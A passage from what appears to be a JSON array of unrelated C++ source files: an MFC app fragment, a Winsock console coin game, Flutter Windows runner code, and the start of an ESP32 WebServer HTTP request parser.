\ud3ec\ud568\ud558\uc5ec \ud45c\uc900 INI \ud30c\uc77c \uc635\uc158\uc744 \ub85c\ub4dc\ud569\ub2c8\ub2e4.\r\n\r\n\r\n\t// \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc758 \ubb38\uc11c \ud15c\ud50c\ub9bf\uc744 \ub4f1\ub85d\ud569\ub2c8\ub2e4.  \ubb38\uc11c \ud15c\ud50c\ub9bf\uc740\r\n\t//  \ubb38\uc11c, \ud504\ub808\uc784 \ucc3d \ubc0f \ubdf0 \uc0ac\uc774\uc758 \uc5f0\uacb0 \uc5ed\ud560\uc744 \ud569\ub2c8\ub2e4.\r\n\tCSingleDocTemplate* pDocTemplate;\r\n\tpDocTemplate = new CSingleDocTemplate(\r\n\t\tIDR_MAINFRAME,\r\n\t\tRUNTIME_CLASS(CColorImageAlpha1Doc),\r\n\t\tRUNTIME_CLASS(CMainFrame),       // \uc8fc SDI \ud504\ub808\uc784 \ucc3d\uc785\ub2c8\ub2e4.\r\n\t\tRUNTIME_CLASS(CColorImageAlpha1View));\r\n\tif (!pDocTemplate)\r\n\t\treturn FALSE;\r\n\tAddDocTemplate(pDocTemplate);\r\n\r\n\r\n\t// \ud45c\uc900 \uc178 \uba85\ub839, DDE, \ud30c\uc77c \uc5f4\uae30\uc5d0 \ub300\ud55c \uba85\ub839\uc904\uc744 \uad6c\ubb38 \ubd84\uc11d\ud569\ub2c8\ub2e4.\r\n\tCCommandLineInfo cmdInfo;\r\n\tParseCommandLine(cmdInfo);\r\n\r\n\r\n\r\n\t// \uba85\ub839\uc904\uc5d0 \uc9c0\uc815\ub41c \uba85\ub839\uc744 \ub514\uc2a4\ud328\uce58\ud569\ub2c8\ub2e4.\r\n\t// \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8\uc774 /RegServer, /Register, /Unregserver \ub610\ub294 /Unregister\ub85c \uc2dc\uc791\ub41c \uacbd\uc6b0 FALSE\ub97c \ubc18\ud658\ud569\ub2c8\ub2e4.\r\n\tif (!ProcessShellCommand(cmdInfo))\r\n\t\treturn FALSE;\r\n\r\n\t// \ucc3d \ud558\ub098\ub9cc \ucd08\uae30\ud654\ub418\uc5c8\uc73c\ubbc0\ub85c \uc774\ub97c \ud45c\uc2dc\ud558\uace0 \uc5c5\ub370\uc774\ud2b8\ud569\ub2c8\ub2e4.\r\n\tm_pMainWnd->ShowWindow(SW_SHOW);\r\n\tm_pMainWnd->UpdateWindow();\r\n\treturn TRUE;\r\n}\r\n\r\nint CColorImageAlpha1App::ExitInstance()\r\n{\r\n\t//TODO: \ucd94\uac00\ud55c \ucd94\uac00 \ub9ac\uc18c\uc2a4\ub97c \ucc98\ub9ac\ud569\ub2c8\ub2e4.\r\n\tAfxOleTerm(FALSE);\r\n\r\n\treturn CWinApp::ExitInstance();\r\n}\r\n\r\n// CColorImageAlpha1App \uba54\uc2dc\uc9c0 \ucc98\ub9ac\uae30\r\n\r\n\r\n// \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8 \uc815\ubcf4\uc5d0 \uc0ac\uc6a9\ub418\ub294 CAboutDlg \ub300\ud654 \uc0c1\uc790\uc785\ub2c8\ub2e4.\r\n\r\nclass CAboutDlg : public CDialogEx\r\n{\r\npublic:\r\n\tCAboutDlg() noexcept;\r\n\r\n// \ub300\ud654 \uc0c1\uc790 \ub370\uc774\ud130\uc785\ub2c8\ub2e4.\r\n#ifdef AFX_DESIGN_TIME\r\n\tenum { IDD = IDD_ABOUTBOX };\r\n#endif\r\n\r\nprotected:\r\n\tvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV \uc9c0\uc6d0\uc785\ub2c8\ub2e4.\r\n\r\n// \uad6c\ud604\uc785\ub2c8\ub2e4.\r\nprotected:\r\n\tDECLARE_MESSAGE_MAP()\r\n};\r\n\r\nCAboutDlg::CAboutDlg() noexcept : CDialogEx(IDD_ABOUTBOX)\r\n{\r\n}\r\n\r\nvoid CAboutDlg::DoDataExchange(CDataExchange* pDX)\r\n{\r\n\tCDialogEx::DoDataExchange(pDX);\r\n}\r\n\r\nBEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)\r\nEND_MESSAGE_MAP()\r\n\r\n// \ub300\ud654 \uc0c1\uc790\ub97c \uc2e4\ud589\ud558\uae30 \uc704\ud55c \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8 \uba85\ub839\uc785\ub2c8\ub2e4.\r\nvoid CColorImageAlpha1App::OnAppAbout()\r\n{\r\n\tCAboutDlg aboutDlg;\r\n\taboutDlg.DoModal();\r\n}\r\n\r\n// CColorImageAlpha1App \uba54\uc2dc\uc9c0 \ucc98\ub9ac\uae30\r\n\r\n\r\n\r\n",
    "\ufeff#define WIN32_LEAN_AND_MEAN // To speed the build process: https://stackoverflow.com/questions/11040133/what-does-defining-win32-lean-and-mean-exclude-exactly\n\n#include <iostream>\n#include <windows.h>\n#include <ws2tcpip.h>\n#include <conio.h>\n#include <string>\n#include <ctime>\n#include <iomanip>\n#include <thread>\n#include <chrono>\n#include <sstream>\nusing namespace std;\n\n#pragma comment (lib, \"Ws2_32.lib\")\n#pragma warning (disable:4996)\n\n#define DEFAULT_BUFLEN 512\n#define DEFAULT_PORT \"27015\" // a port is a logical construct that identifies a specific process or a type of network service - https://en.wikipedia.org/wiki/Port_(computer_networking)\n\n#define PAUSE 1\n\n// Accept a client socket\nSOCKET ClientSocket = INVALID_SOCKET;\n\nCOORD server_smile;\nCOORD client_smile;\n\nint server_coin_count = 0;\nint client_coin_count = 0;\n\nbool timeUp = false; // \u0424\u043b\u0430\u0433 \u0434\u043b\u044f \u0432\u0438\u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f \u0437\u0430\u043a\u0456\u043d\u0447\u0435\u043d\u043d\u044f \u0447\u0430\u0441\u0443\nchar** map = nullptr;\n\n\nenum class KeyCodes { LEFT = 75, RIGHT = 77, UP = 72, DOWN = 80, ENTER = 13, ESCAPE = 27, SPACE = 32, ARROWS = 224 };\nenum class Colors { BLUE = 9, RED = 12, BLACK = 0, YELLOW = 14, DARKGREEN = 2 };\n\nbool collision = false;\n\nvoid UpdateGameTimeInWindowTitle() {\n\tauto start = chrono::system_clock::now(); // \u0417\u0430\u043f\u043e\u043c\u0438\u043d\u0430\u0435\u043c \u0432\u0440\u0435\u043c\u044f \u043d\u0430\u0447\u0430\u043b\u0430 \u0438\u0433\u0440\u044b\n\n\twhile (!timeUp) { // \u041f\u043e\u043a\u0438 \u0447\u0430\u0441 \u043d\u0435 \u0432\u0438\u0447\u0435\u0440\u043f\u0430\u043d\u043e\n\t\tauto now = chrono::system_clock::now(); // \u041e\u0442\u0440\u0438\u043c\u0443\u0454\u043c\u043e \u043f\u043e\u0442\u043e\u0447\u043d\u0438\u0439 \u0447\u0430\u0441\n\t\tauto elapsed_minutes = chrono::duration_cast<chrono::minutes>(now - start); // \u0412\u0438\u0437\u043d\u0430\u0447\u0430\u0454\u043c\u043e \u043f\u0440\u043e\u0439\u0448\u043b\u0438\u0439 \u0447\u0430\u0441 \u0437 \u043f\u043e\u0447\u0430\u0442\u043a\u0443 \u0433\u0440\u0438\n\t\tauto elapsed_seconds = chrono::duration_cast<chrono::seconds>(now - start); // \u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043f\u0440\u043e\u0448\u0435\u0434\u0448\u0435\u0435 \u0432\u0440\u0435\u043c\u044f \u0441 \u043d\u0430\u0447\u0430\u043b\u0430 \u0438\u0433\u0440\u044b\n\n\t\tif (elapsed_minutes.count() >= 1) { // \u042f\u043a\u0449\u043e \u043f\u0440\u043e\u0439\u0448\u043b\u0430 1 \u0445\u0432\u0438\u043b\u0438\u043d\u0430\n\t\t\tauto now = chrono::system_clock::now(); // \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u0432\u0440\u0435\u043c\u044f\n\t\t\tauto elapsed_seconds = chrono::duration_cast<chrono::seconds>(now - start); // \u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043f\u0440\u043e\u0448\u0435\u0434\u0448\u0435\u0435 \u0432\u0440\u0435\u043c\u044f \u0441 \u043d\u0430\u0447\u0430\u043b\u0430 \u0438\u0433\u0440\u044b\n\t\t\ttimeUp = true;\n\t\t\tstring coinCountMessage = \"SERVER_COINS:\" + to_string(server_coin_count);\n\t\t\tint iSendResult = send(ClientSocket, coinCountMessage.c_str(), coinCountMessage.size(), 0);// \u0412\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u044e\u0454\u043c\u043e \u0444\u043b\u0430\u0433, \u0449\u043e \u0447\u0430\u0441 \u0432\u0438\u0447\u0435\u0440\u043f\u0430\u043d\u043e\n\t\t\tif (iSendResult == SOCKET_ERROR) {\n\t\t\t\tcout << \"send failed with error: \" << WSAGetLastError() << \"\\n\";\n\t\t\t\tclosesocket(ClientSocket);\n\t\t\t\tWSACleanup();\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tbreak; // \u0412\u0438\u0445\u0456\u0434 \u0437 \u0446\u0438\u043a\u043b\u0443\n\t\t}\n\n\t\t// \u0424\u043e\u0440\u043c\u0430\u0442\u0443\u0454\u043c\u043e \u0432\u0438\u0432\u0456\u0434 \u0447\u0430\u0441\u0443 \u0456 \u0432\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u044e\u0454\u043c\u043e \u0439\u043e\u0433\u043e \u0443 \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u043a \u0432\u0456\u043a\u043d\u0430\n\t\tstringstream ss;\n\t\tss << setw(2) << setfill('0') << elapsed_minutes.count() / 60 << \":\"; // \u0413\u043e\u0434\u0438\u043d\u0438\n\t\tss << setw(2) << setfill('0') << elapsed_minutes.count() % 60 << \":\"; // \u0425\u0432\u0438\u043b\u0438\u043d\u0438\n\t\tss << setw(2) << setfill('0') <<elapsed_seconds.count() % 60; // \u0421\u0435\u043a\u0443\u043d\u0434\u044b\n\t\tstring timeStr = ss.str();\n\t\tSetConsoleTitleA(timeStr.c_str());\n\n\t\t// \u0417\u0430\u0442\u0440\u0438\u043c\u043a\u0430 \u043d\u0430 1 \u0441\u0435\u043a\u0443\u043d\u0434\u0443\n\t\tthis_thread::sleep_for(chrono::seconds(1));\n\t}\n\n\tsystem(\"cls\");\n\n\t// \u041f\u043e\u043a\u0430\u0437\u0430\u0442\u0438 \u0440\u0430\u0445\u0443\u043d\u043e\u043a \u0441\u0435\u0440\u0432\u0435\u0440\u0430 \u0442\u0430 \u043a\u043b\u0456\u0454\u043d\u0442\u0430\n\tcout << \"SERVER: \" << server_coin_count << endl;\n\tcout << \"CLIENT: \" << client_coin_count << endl;\n\n}\n\nvoid UpdateClientGameTimeInWindowTitle(const string& timeStr) {\n\tSetConsoleTitleA(timeStr.c_str()); // \u0412\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u044e\u0454\u043c\u043e \u0447\u0430\u0441 \u0443 \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u043a \u0432\u0456\u043a\u043d\u0430\n}\n\nvoid GenerateMap(char**& map, const unsigned int height, const unsigned int width) {\n\tmap = new char* [height]; // \u044d\u0442\u043e \u043e\u0434\u043d\u043e\u043c\u0435\u0440\u043d\u044b\u0439 \u043c\u0430\u0441\u0441\u0438\u0432 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u0435\u0439\n\tfor (int y = 0; y < height; y++) // \u043f\u0435\u0440\u0435\u0431i\u0440 \u0440\u044f\u0434\u043ai\u0432\n\t{\n\t\tmap[y] = new char[width]; // \u043f\u043e\u0434 \u043a\u0430\u0436\u0434\u044b\u0439 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u0432 \u043c\u0430\u0441\u0441\u0438\u0432\u0435 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u0435\u0439 \u043d\u0443\u0436\u043d\u043e \u0432\u044b\u0434\u0435\u043b\u0438\u0442\u044c \u043f\u0430\u043c\u044f\u0442\u044c \u043f\u043e\u0434 \u043e\u0434\u043d\u043e\u043c\u0435\u0440\u043d\u044b\u0439 \u043c\u0430\u0441\u0441\u0438\u0432 \u0434\u0430\u043d\u043d\u044b\u0445 \u0442\u0438\u043f\u0430 \u0447\u0430\u0440\n\t\tfor (int x = 0; x < width; x++) // \u043f\u0435\u0440\u0435\u0431i\u0440 \u043a\u043e\u0436\u043d\u043ei \u043a\u043e\u043ci\u0440\u043a\u0438 \u0432 \u043c\u0435\u0436\u0430\u0445 \u0440\u044f\u0434\u043a\u0430\n\t\t{\n\t\t\tmap[y][x] = ' '; // \u0437\u0430 \u0437\u0430\u043c\u043e\u0432\u0447\u0443\u0432\u0430\u043d\u043d\u044f\u043c \u0432\u0441i \u043a\u043e\u043ci\u0440\u043a\u0438 - \u0446\u0435 \u043a\u043e\u0440\u0438\u0434\u043e\u0440\u0438 \n\n\t\t\t// \u0442\u0443\u0442 \u0445\u043e\u0440\u043e\u0448\u0435 \u043ci\u0441\u0446\u0435 \u0434\u043b\u044f \u0433\u0435\u043d\u0435\u0440\u0430\u0446ii \u0441\u0442i\u043d (\u0414\u0417)\n\t\t\t// \n\t\t\t// \u0433\u0435\u043d\u0435\u0440\u0443\u0435\u043c\u043e \u0441\u043a\u0430\u0440\u0431\u0438\n\n\t\t\tint r = rand() % 10; // 0...9\n\t\t\tif (r == 0)\n\t\t\t\tmap[y][x] = '.';\n\n\t\t\tif (x == 0 || x == width - 1 || y == 0 || y == height - 1)\n\t\t\t\tmap[y][x] = '#'; // \u0441\u0442i\u043d\u043a\u0430\n\t\t\tif (x == width - 1 && y == height / 2)\n\t\t\t\tmap[y][x] = ' '; // \u0432\u0438\u0445i\u0434 \n\t\t\tif (x == 1 && y == 1) {\n\t\t\t\tmap[y][x] = '1'; // \u0433\u0440\u0430\u0432\u0435\u0446\u044c \u0441\u0435\u0440\u0432\u0435\u0440\u0430\n\t\t\t\tserver_smile.X = x;\n\t\t\t\tserver_smile.Y = y;\n\t\t\t}\n\t\t\tif (x == 1 && y == 3) {\n\t\t\t\tmap[y][x] = '2'; // \u0433\u0440\u0430\u0432\u0435\u0446\u044c \u043a\u043bi\u0435\u043d\u0442\u0430\n\t\t\t\tclient_smile.X = x;\n\t\t\t\tclient_smile.Y = y;\n\t\t\t}\n\t\t\tr = rand() % 10; // \u0433\u0435\u043d\u0435\u0440\u0438\u0440\u0443\u0435\u043c \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e \u043e\u0442 0 \u0434\u043e 9\n\t\t\tif (r == 0 && map[y][x] != '1' && map[y][x] != '2') // \u0435\u0441\u043b\u0438 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e \u0440\u0430\u0432\u043d\u043e 0 \u0438 \u043a\u043b\u0435\u0442\u043a\u0430 \u043d\u0435 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0438\u0433\u0440\u043e\u043a\u0430, \u0442\u043e \u0441\u043e\u0437\u0434\u0430\u0435\u043c \u0441\u0442\u0435\u043d\u0443\n\t\t\t\tmap[y][x] = '#';\n\t\t}\n\t}\n}\n\nvoid ShowMap(char** map, const unsigned int height, const unsigned int width) {\n\tsetlocale(0, \"C\");\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\tfor (int y = 0; y < height; y++) // \u043f\u0435\u0440\u0435\u0431i\u0440 \u0440\u044f\u0434\u043ai\u0432\n\t{\n\t\tfor (int x = 0; x < width; x++) // \u043f\u0435\u0440\u0435\u0431i\u0440 \u043a\u043e\u0436\u043d\u043ei \u043a\u043e\u043ci\u0440\u043a\u0438 \u0432 \u043c\u0435\u0436\u0430\u0445 \u0440\u044f\u0434\u043a\u0430\n\t\t{\n\t\t\tif (map[y][x] == ' ')\n\t\t\t{\n\t\t\t\tSetConsoleTextAttribute(h, WORD(Colors::BLACK));\n\t\t\t\tcout << \" \";\n\t\t\t}\n\t\t\telse if (map[y][x] == '#')\n\t\t\t{\n\t\t\t\tSetConsoleTextAttribute(h, WORD(Colors::DARKGREEN));\n\t\t\t\tcout << (char)219; // cout << \"#\"; \n\t\t\t}\n\t\t\telse if (map[y][x] == '1')\n\t\t\t{\n\t\t\t\tSetConsoleTextAttribute(h, WORD(Colors::RED));\n\t\t\t\tcout << (char)160; // cout << \"@\";\n\t\t\t}\n\t\t\telse if (map[y][x] ==",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"profile_screen\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n  Parsing.cpp - HTTP request parsing.\n\n  Copyright (c) 2015 Ivan Grokhotkov. All rights reserved.\n\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n  Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n  Modified 8 May 2015 by Hristo Gochkov (proper post and file upload handling)\n*/\n\n#include <Arduino.h>\n#include <esp32-hal-log.h>\n#include \"WiFiServer.h\"\n#include \"WiFiClient.h\"\n#include \"WebServer.h\"\n#include \"detail/mimetable.h\"\n\n#ifndef WEBSERVER_MAX_POST_ARGS\n#define WEBSERVER_MAX_POST_ARGS 32\n#endif\n\n#define __STR(a) #a\n#define _STR(a) __STR(a)\nconst char * _http_method_str[] = {\n#define XX(num, name, string) _STR(name),\n  HTTP_METHOD_MAP(XX)\n#undef XX\n};\n\nstatic const char Content_Type[] PROGMEM = \"Content-Type\";\nstatic const char filename[] PROGMEM = \"filename\";\n\nstatic char* readBytesWithTimeout(WiFiClient& client, size_t maxLength, size_t& dataLength, int timeout_ms)\n{\n  char *buf = nullptr;\n  dataLength = 0;\n  while (dataLength < maxLength) {\n    int tries = timeout_ms;\n    size_t newLength;\n    while (!(newLength = client.available()) && tries--) delay(1);\n    if (!newLength) {\n      break;\n    }\n    if (!buf) {\n      buf = (char *) malloc(newLength + 1);\n      if (!buf) {\n        return nullptr;\n      }\n    }\n    else {\n      char* newBuf = (char *) realloc(buf, dataLength + newLength + 1);\n      if (!newBuf) {\n        free(buf);\n        return nullptr;\n      }\n      buf = newBuf;\n    }\n    client.readBytes(buf + dataLength, newLength);\n    dataLength += newLength;\n    buf[dataLength] = '\\0';\n  }\n  return buf;\n}\n\nbool WebServer::_parseRequest(WiFiClient& client) {\n  // Read the first line of HTTP request\n  String req = client.readStringUntil('\\r');\n  client.readStringUntil('\\n');\n  //reset header value\n  for (int i = 0; i < _headerKeysCount; ++i) {\n    _currentHeaders[i].value =String();\n  }\n\n  // First line of HTTP request looks like \"GET /path HTTP/1.1\"\n  // Retrieve the \"/path\" part by finding the spaces\n  int addr_start = req.indexOf(' ');\n  int addr_end = req.indexOf(' ', addr_start + 1);\n  if (addr_start == -1 || addr_end == -1) {\n    log_e(\"Invalid request: %s\", req.c_str());\n    return false;\n  }\n\n  String methodStr = req.substring(0, addr_start);\n  String url = req.substring(addr_start + 1, addr_end);\n  String versionEnd = req.substring(addr_end + 8);\n  _currentVersion = atoi(versionEnd.c_str());\n  String searchStr = \"\";\n  int hasSearch = url.indexOf('?');\n  if (hasSearch != -1){\n    searchStr = url.substring(hasSearch + 1);\n    url = url.substring(0, hasSearch);\n  }\n  _currentUri = url;\n  _chunked = false;\n  _clientContentLength = 0;  // not known yet, or invalid\n\n  HTTPMethod method = HTTP_ANY;\n  size_t num_methods = sizeof(_http_method_str) / sizeof(const char *);\n  for (size_t i=0; i<num_methods; i++) {\n    if (methodStr == _http_method_str[i]) {\n      method = (HTTPMethod)i;\n      break;\n    }\n  }\n  if (method == HTTP_ANY) {\n    log_e(\"Unknown HTTP Method: %s\", methodStr.c_str());\n    return false;\n  }\n  _currentMethod = method;\n\n  log_v(\"method: %s url: %s search: %s\", methodStr.c_str(), url.c_str(), searchStr.c_str());\n\n  //attach handler\n  RequestHandler* handler;\n  for (handler = _firstHandler; handler; handler = handler->next()) {\n    if (handler->canHandle(_currentMethod, _currentUri))\n      break;\n  }\n  _currentHandler = handler;\n\n  String formData;\n  // below is needed only when POST type request\n  if (method == HTTP_POST || method == HTTP_PUT || method == HTTP_PATCH || method == HTTP_DELETE){\n    String boundaryStr;\n    String headerName;\n    String headerValue;\n    bool isForm = false;\n    bool isEncoded = false;\n    //parse headers\n    while(1){\n      req = client.readStringUntil('\\r');\n      client.readStringUntil('\\n');\n      if (req == \"\") break;//no moar headers\n      int headerDiv = req.indexOf(':');\n      if (headerDiv == -1){\n        break;\n      }\n      headerName = req.substring(0, headerDiv);\n      headerValue = req.substring(headerDiv + 1);\n      headerValue.trim();\n       _collectHeader(headerName.c_str(),headerValue.c_str());\n\n      log_v(\"headerName: %s\", headerName.c_str());\n      log_v(\"headerValue: %s\", headerValue.c_str());\n\n      if (headerName.equalsIgnoreCase(FPSTR(Content_Type))){\n        using namespace mime;\n        if (headerValue.startsWith(FPSTR(mimeTable[txt].mimeType))){\n          isForm = false;\n        } else if (headerValue.starts",
